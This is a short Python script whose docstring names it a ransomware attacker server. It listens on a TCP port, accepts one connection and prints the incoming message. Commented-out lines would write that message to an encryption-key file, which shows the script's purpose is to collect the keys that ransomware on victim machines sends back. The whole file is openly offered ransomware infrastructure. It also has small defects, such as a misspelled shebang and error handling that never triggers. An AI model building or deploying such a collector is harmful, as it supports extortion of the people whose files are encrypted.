#!/usr/bin/evn python3.11
"""
 Ransomware Connection Server (Attacker Server)
"""

from socket import socket, AF_INET, SOCK_STREAM
from contextlib import suppress

with suppress(KeyboardInterrupt, ValueError, TypeError) as Error:
    HEADER: int = 1024
    FORMAT: str = "utf-8"
    HOST_ADDR: str = "192.168.100.4"
    HOST_PORT_No: int = 8088
    ADDR: tuple = (HOST_ADDR, HOST_PORT_No)

    with socket(family=AF_INET, type=SOCK_STREAM) as HOST:
        HOST.bind(ADDR)
        HOST.listen(1)
        print(f"[SERVER] Listening On {ADDR}")

        def ConnectionAccept() -> None:
            connection, address = HOST.accept()
            print(f"[SERVER] CONNECTION RECEIVED SUCCESSFULLY FROM     {address}")
            msg: str = connection.recv(HEADER).decode(FORMAT)
            # with open("EncryptionKEY.txt", "a") as EKFile:
            #     EKFile.write(msg)
            print(msg)
        ConnectionAccept()
if Error:
    print(f"Error {Error}")
